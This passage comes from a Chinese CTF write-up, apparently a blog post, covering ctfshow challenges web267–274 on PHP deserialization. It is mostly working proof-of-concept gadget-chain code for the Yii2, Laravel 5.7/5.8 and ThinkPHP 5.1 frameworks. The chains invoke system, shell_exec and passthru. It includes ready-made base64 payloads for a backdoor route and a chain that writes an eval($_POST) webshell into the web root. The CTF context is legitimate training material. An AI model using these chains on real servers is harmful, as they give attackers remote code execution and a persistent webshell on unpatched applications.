class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​之后通过 get 上传：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell<span class="built_in">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><p>​就能打出 phpinfo，之后使用 passthru 即可获得 flag，system 没有回显，不知道为啥，不过也可以 echo 一句话木马进一个文件也行。</p><h1 id="web268"><a class="markdownIt-Anchor" href="#web268">#</a> web268：</h1><p>​相比于上一题有过滤，换一个 poc 即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &quot;<span class="title class_">echo</span> &#x27;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&#x27; &gt; /var/www/html/basic/web/1.php&quot;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize($exp)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>​之后 exp 为：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=/backdoor/shell<span class="built_in">&amp;</span>code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure><p>​然后访问 1.php 然后 post 一个 1=system (“cat /flags”); 即可</p><h1 id="web269"><a class="markdownIt-Anchor" href="#web269">#</a> web269：</h1><p>​和上一个题一模一样，没任何区别。</p><h1 id="web270"><a class="markdownIt-Anchor" href="#web270">#</a> web270：</h1><p>​268 题的 poc 依旧能用，直接用。</p><h1 id="web271"><a class="markdownIt-Anchor" href="#web271">#</a> web271：</h1><p>​Laravel 5.7 的反序列化漏洞，源码在这儿：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcmF2ZWwvbGFyYXZlbC90cmVlLzUuNyVFMyU4MCU4Mg==">https://github.com/laravel/laravel/tree/5.7。</span></p><p>​不大会开发，直接上 poc 算了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters[]=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app=<span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web272"><a class="markdownIt-Anchor" href="#web272">#</a> web272：</h1><p>​上一篇文章：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTEzODM1MDU3">laravel5.8 反序列化漏洞复现</span></p><p>​直接上 poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;tac /f*&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web273"><a class="markdownIt-Anchor" href="#web273">#</a> web273：</h1><p>​用这个 poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>=&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>=&quot;<span class="title class_">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web274"><a class="markdownIt-Anchor" href="#web274">#</a> web274：</h1><p>​thinkphp 反序列化，贴个文章：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjYxOT90aW1lX18xMzExPW40JTJCeG5EMERnNyUzRDd3eFdxR05ubURVeFlxS1F1NUQ1aTVRNXBkeCN0b2MtMQ==">thinkphp5.1.x~5.2.x 版本反序列化链挖掘分析</span></p><p>​放个 poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span 